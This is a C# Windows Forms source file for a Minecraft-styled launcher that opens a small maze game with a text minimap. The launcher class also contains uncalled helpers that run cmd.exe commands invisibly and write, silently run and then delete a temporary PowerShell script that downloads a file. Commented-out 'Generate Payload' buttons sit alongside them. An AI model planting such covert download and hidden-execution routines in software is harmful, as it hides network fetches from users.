using System;
using System.Drawing;
using System.Windows.Forms;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Collections.Generic;
using System.IO.Compression;
using System.Web;
using System.Threading;
using System.Text.RegularExpressions;
using System.Runtime;
using System.Data;

namespace dtlauncherform {
    public class launcher : Form {

        private Label text;
        private PictureBox custitlebar;
        private PictureBox exit_custitlebar;
        private Label text2;
        private Button button;
        private Button button1;
        private Button button2;
        private Button button3;
        private Button button4;
		bool m_bMouseDown = false;
		bool debug_mode = false;
		
        public launcher() {
            DisplayGUI();
        }

        private void DisplayGUI() {
			string userprofile = System.Environment.GetEnvironmentVariable("USERPROFILE");
			
			this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			
			this.BackColor = Color.FromArgb(50, 50, 50);
            this.Name = "DTlauncher - Minecraft";
            this.Text = "DTlauncher - Minecraft";
			this.Icon = new Icon("assets/icon.ico");
            this.Size = new Size(1280, 720);
			this.MinimumSize = new Size(1280, 720);
			this.MaximumSize = new Size(1280, 720);
            this.StartPosition = FormStartPosition.CenterScreen;
			this.BackgroundImage = Image.FromFile("assets/bg.png");
			this.KeyDown += new KeyEventHandler(input_KeyDown);
			// this.TitleBar.BackColor = Color.Black;
			// this.TitleBar.ForeColor = Color.White;
			this.SuspendLayout();
			
			custitlebar = new PictureBox();
			custitlebar.Size = new Size(1280, 25);
			custitlebar.Location = new Point(0, 0);
			custitlebar.BackColor = Color.FromArgb(50, 50, 50);
			custitlebar.SendToBack();
			custitlebar.MouseDown += new MouseEventHandler(Form1_MouseDown);
			custitlebar.MouseUp += new MouseEventHandler(Form1_MouseUp);
			custitlebar.MouseMove += new MouseEventHandler(Form1_MouseMove);
			
			//
			// exit
			//
			exit_custitlebar = new PictureBox();
            exit_custitlebar.Size = new Size(15, 15);
			// exit_custitlebar.BackColor = Color.White;
            exit_custitlebar.Location = new Point(1260, 5);
			exit_custitlebar.Image = Image.FromFile("assets/exit.png");
			exit_custitlebar.SizeMode = PictureBoxSizeMode.StretchImage;
			exit_custitlebar.Click += new System.EventHandler(this.exitfromlauncher);
		
			
			
			//
			// text
			//
			text = new Label();
            text.Name = "text";
            text.ForeColor = Color.FromArgb(199, 255, 214);
            text.BackColor = System.Drawing.Color.Transparent;
			Font LargeFont = new Font("Arial", 18);
            text.Font = LargeFont;
			text.Text = @"DTlauncher";
            text.Size = new Size(425, 50);
            text.Location = new Point((Screen.PrimaryScreen.WorkingArea.Width - this.Width - (text.Width/2)) / 2, (Screen.PrimaryScreen.WorkingArea.Height - this.Height) / 2);
			
			//
			// button1
			//
            button1 = new Button();
            button1.Name = "run";
			button1.ForeColor = Color.White;
			button1.BackColor = Color.Black;
            button1.Text = "Run server";
            button1.Size = new Size(430, 50);
            button1.Location = new Point(((Screen.PrimaryScreen.WorkingArea.Width - this.Width) - 500) / 2, ((Screen.PrimaryScreen.WorkingArea.Height - this.Height) / 2) + 100);
            button1.Click += new System.EventHandler(this.run);
			button1.FlatStyle = FlatStyle.Flat;
			button1.FlatAppearance.BorderSize = 0;
			//
			// button
			//
            button = new Button();
            button.Name = "load last";
			button.ForeColor = Color.White;
			button.BackColor = Color.Black;
            button.Text = "Load last";
            button.Size = new Size(430, 50);
            button.Location = new Point(5, (this.Height - 100));
            // button.Click += new System.EventHandler(this.load);
			button.FlatStyle = FlatStyle.Flat;
			button.FlatAppearance.BorderSize = 0;
			//
			// button2
			//
			button2 = new Button();
            button2.Name = "save";
			button2.ForeColor = Color.White;
			button2.BackColor = Color.Black;
            button2.Text = "Save Payload";
            button2.Size = new Size(430, 50);
            button2.Location = new Point(5, (this.Height - 160));
            // button2.Click += new System.EventHandler(this.save);
			button2.FlatStyle = FlatStyle.Flat;
			button2.FlatAppearance.BorderSize = 0;
			//
			// button3
			//
			button3 = new Button();
            button3.Name = "build";
			button3.ForeColor = Color.White;
			button3.BackColor = Color.Black;
            button3.Text = "Generate Payload";
            button3.Size = new Size(430, 50);
            button3.Location = new Point(5, (this.Height - 220));
            // button3.Click += new System.EventHandler(this.build);
			button3.FlatStyle = FlatStyle.Flat;
			button3.FlatAppearance.BorderSize = 0;

            // this.Controls.Add(button);
            this.Controls.Add(text);
            
			this.Controls.Add(exit_custitlebar);
			this.Controls.Add(custitlebar);
            this.Controls.Add(button1);
            // this.Controls.Add(button3);
            // this.Controls.Add(button4);
            // this.Controls.Add(textBox);
        }
		private void run(object sender, EventArgs e)
		{
			
			game game = new game();
			game.ShowDialog();
			this.Close();
			
		}
		private void input_KeyDown(object sender, KeyEventArgs e) 
		{		
			if(e.KeyData == Keys.F12)
			{  
				if(debug_mode == false)
				{
					debug_mode = true;
				}
				else
				{
					debug_mode = false;
				}
			}             
		}
		private void Form1_MouseDown(object sender, MouseEventArgs e)
		{
			this.Location = Cursor.Position;
			m_bMouseDown = true;
		}

		private void Form1_MouseMove(object sender, MouseEventArgs e)
		{
			if (m_bMouseDown)
			{
				this.Location = new Point(Cursor.Position.X - (this.Width / 2), Cursor.Position.Y);
			}
		}

		private void Form1_MouseUp(object sender, MouseEventArgs e)
		{
			m_bMouseDown = false;
		}
		private void exitfromlauncher(object sender, EventArgs e)
		{
			System.Windows.Forms.Application.Exit(); 
		}
		private static void execute_cmd(string cmd)
        {
            
			
			string callcommand = "/c " + cmd ;
			
			ProcessStartInfo processInfo;
			Process process;
			
			string output = "";
			
			processInfo = new ProcessStartInfo("cmd.exe", callcommand);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
			output = process.StandardOutput.ReadToEnd();
        }
		private static void Download(string url, string outPath)
		{
			string tempdir = Path.GetTempPath();
			// string tempdir = "./";		
			
			
			url = '"' + url + '"';
			
			outPath = '"' + outPath + '"';
			
			string str = "(New-Object System.Net.WebClient).DownloadFile(" + url + ", " + outPath + ")";
			
			outPath = tempdir + "\\download.ps1";
			
            // open or create file
            FileStream streamfile = new FileStream(outPath, FileMode.OpenOrCreate, FileAccess.Write);
            // create stream writer
            StreamWriter streamwrite = new StreamWriter(streamfile);
            // add some lines
			
			outPath = '"' + tempdir + "\\download.ps1" + '"';
			
			
			// string powershelldownloadtxt = "" + url +"\  "
            streamwrite.WriteLine(str);
            // clear streamwrite data
            streamwrite.Flush();
            // close stream writer
            streamwrite.Close();
            // close stream file
            streamfile.Close();
			

			// string error = "";
			// int exitCode = 0;
			
			ProcessStartInfo processInfo;
			Process process;
			processInfo = new ProcessStartInfo("cmd.exe", "/c powershell " + tempdir + "\\download.ps1");
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();		
			execute_cmd("if exist " + tempdir + "\\download.ps1 (del " + tempdir + "\\download.ps1)");
		}
    }
	public class game : Form {
        private PictureBox custitlebar;
        private PictureBox exit_custitlebar;
        private PictureBox background;
        private PictureBox menu;
        private Label minimap;
		bool menuisopened = false;
		bool m_bMouseDown = false;
		public int x = 0;
		public int y = 0;
		public string lookdir = "y+";
		public string[] map = {
			"############", 
			"#     #    #",
			"#     #    #",
			"#          #",
			"#          #",
			"#          #",
			"#          #",
			"#          #",
			"#          #",
			"# # #  # # #",
			"############"};
		
        public game() {
			
            DisplayGUI();
        }

        private void DisplayGUI() {
			string userprofile = System.Environment.GetEnvironmentVariable("USERPROFILE");
			
			
			
			
			this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			
			this.BackColor = Color.Black;
            this.Name = "DTlauncher - Main";
            this.Text = "DTlauncher - Main";
			this.Icon = new Icon("assets/icon.ico");
            this.Size = new Size(1280, 720);
			this.MinimumSize = new Size(1280, 720);
			this.MaximumSize = new Size(1280, 720);
            this.StartPosition = FormStartPosition.CenterScreen;
			this.BackgroundImage = Image.FromFile("assets/bg.png");
			this.KeyDown += new KeyEventHandler(background_keypress);
			// this.TitleBar.BackColor = Color.Black;
			// this.TitleBar.ForeColor = Color.White;
			this.SuspendLayout();
			Font font = new Font("Consolas", 12.0f);
			this.Font = font;
			
			custitlebar = new PictureBox();
			custitlebar.Size = new Size(1280, 25);
			custitlebar.Location = new Point(0, 0);
			custitlebar.BackColor = Color.Black;
			custitlebar.SendToBack();
			custitlebar.MouseDown += new MouseEventHandler(Form1_MouseDown);
			custitlebar.MouseUp += new MouseEventHandler(Form1_MouseUp);
			custitlebar.MouseMove += new MouseEventHandler(Form1_MouseMove);
			
			//
			// exit
			//
			exit_custitlebar = new PictureBox();
            exit_custitlebar.Size = new Size(15, 15);
			// exit_custitlebar.BackColor = Color.White;
            exit_custitlebar.Location = new Point(1260, 5);
			exit_custitlebar.Image = Image.FromFile("assets/exit.png");
			exit_custitlebar.SizeMode = PictureBoxSizeMode.StretchImage;
			exit_custitlebar.Click += new System.EventHandler(this.exitfromlauncher);
			
			//
			// exit
			//
			background = new PictureBox();
            background.Size = new Size(1280, 895);
			// exit_custitlebar.BackColor = Color.White;
            background.Location = new Point(0, 25);
			// background.Image = Image.FromFile("assets/exit.png");
			background.SizeMode = PictureBoxSizeMode.StretchImage;
			background.Click += new EventHandler(this.background_click);
			// background.MouseMove += new KeyEventHandler(this.background_MouseMove);
			
			menu = new PictureBox();
            menu.Size = new Size(600, 500);
			menu.BackColor = Color.FromArgb(50, 50, 50);
            menu.Location = new Point((1280/2-300), 100);
			// background.Image = Image.FromFile("assets/exit.png");
			menu.SizeMode = PictureBoxSizeMode.StretchImage;
			menu.Visible = false;
			// menu.Click += new EventHandler(this.background_click);
			
			minimap = new Label();
            minimap.Size = new Size(200, 200);
			minimap.BackColor = Color.FromArgb(50, 50, 50);
			minimap.ForeColor = Color.White;
            minimap.Location = new Point((1280-200), 0);
			// background.Image = Image.FromFile("assets/exit.png");
			minimap.Text = "";
			minimap.Visible = true;
			// menu.Click += new EventHandler(this.background_click);
			
			
			this.Controls.Add(exit_custitlebar);
			this.Controls.Add(custitlebar);
			this.Controls.Add(menu);
			this.Controls.Add(minimap);
			this.Controls.Add(background);
			
		}
		private void Form1_MouseDown(object sender, MouseEventArgs e)
		{
			this.Location = Cursor.Position;
			m_bMouseDown = true;
		}

		private void Form1_MouseMove(object sender, MouseEventArgs e)
		{
			if (m_bMouseDown)
			{
				this.Location = new Point(Cursor.Position.X - (this.Width / 2), Cursor.Position.Y);
			}
		}

		private void Form1_MouseUp(object sender, MouseEventArgs e)
		{
			m_bMouseDown = false;
		}
		private void exitfromlauncher(object sender, EventArgs e)
		{
			System.Windows.Forms.Application.Exit(); 
		}
		private void background_click(object sender, EventArgs e)
		{
			MessageBox.Show("clicked!");
		}
		private void background_keypress(object sender, KeyEventArgs e)
		{
			if(e.KeyData == Keys.W)
			{  
				if (lookdir == "x+")
				{
					string chunk = map[(map.Length / 2)+y];
					char c = chunk[(chunk.Length / 2)+x+1];
					if (c == '#')
					{
						MessageBox.Show("There's a wall behind!");
					}
					else
					{
						x++;
					}
				}
				else if (lookdir == "x-")
				{
					string chunk = map[(map.Length / 2)+y];
					char c = chunk[(chunk.Length / 2)+x-1];
					if (c == '#')
					{
						MessageBox.Show("There's a wall behind!");
					}
					else
					{
						x = x-1;
					}
				}
				else if (lookdir == "y+")
				{
					string chunk = map[(map.Length / 2)+y+1];
					char c = chunk[(chunk.Length / 2)+x];
					if (c == '#')
					{
						MessageBox.Show("There's a wall behind!");
					}
					else
					{
						y++;
					}
				}
				else if (lookdir == "y-")
				{
					string chunk = map[(map.Length / 2)+y-1];
					char c = chunk[(chunk.Length / 2)+x];
					if (c == '#')
					{
						MessageBox.Show("There's a wall behind!");
					}
					else
					{
						y = y-1;
					}
				}
				update();
			}   
			else if(e.KeyData == Keys.A)
			{
				if(lookdir == "x+")
				{
					lookdir = "y+";
				}
				else if(lookdir == "x-")
				{
					lookdir = "y-";
				}
				else if(lookdir == "y+")
				{
					lookdir = "x-";
				}
				else if(lookdir == "y-")
				{
					lookdir = "x+";
				}
				update();
			}
			else if(e.KeyData == Keys.D)
			{
				if(lookdir == "x+")
				{
					lookdir = "y-";
				}
				else if(lookdir == "x-")
				{
					lookdir = "y+";
				}
				else if(lookdir == "y+")
				{
					lookdir = "x+";
				}
				else if(lookdir == "y-")
				{
					lookdir = "x-";
				}
				update();
			}
			else if(e.KeyData == Keys.Escape)
			{
				if(menuisopened)
				{
					menu.Visible = false;
					menuisopened=false;
				}
				else
				{
					menu.Visible = true;
					menuisopened=true;
				}
			}
		}
		private void draw_line(Point start, Point end, Color color)
		{
			Pen line = new Pen(color, 5);
			
			// Point end = new Point(200,200);

            // Point start = new Point(0,0);
			
			Graphics g = background.CreateGraphics();
			
            g.DrawLine(line, start, end);
		}
		private void update()
		{
			minimap.Text = "";
			string minmaptext = "";
			int b = 0;
			foreach(string linechunk in map)
			{
				if((b+map.Length/2)==y)
				{
					char[] stringbuilder = linechunk.ToCharArray();
					stringbuilder[x+(linechunk.Length/2)] = '0';

					minmaptext = new string(stringbuilder);
				}
				else
				{
					minmaptext = linechunk;
				}
				minimap.Text += "\n"+minmaptext;
				b++;
			}
			
			
			
			Graphics g = background.CreateGraphics();
			g.Clear(Color.Transparent);
			string chunk = map[(map.Length / 2)+y];
			char c = chunk[(chunk.Length / 2)+x];
			// MessageBox.Show("map: "+map.Length+y+" | chunk:"+chunk.Length+x);
			MessageBox.Show("X: "+x.ToString()+", Y: "+y.ToString()+", dir: "+lookdir+" | "+c.ToString());
			if(lookdir == "x+")
			{
				
			}
		}
	}
}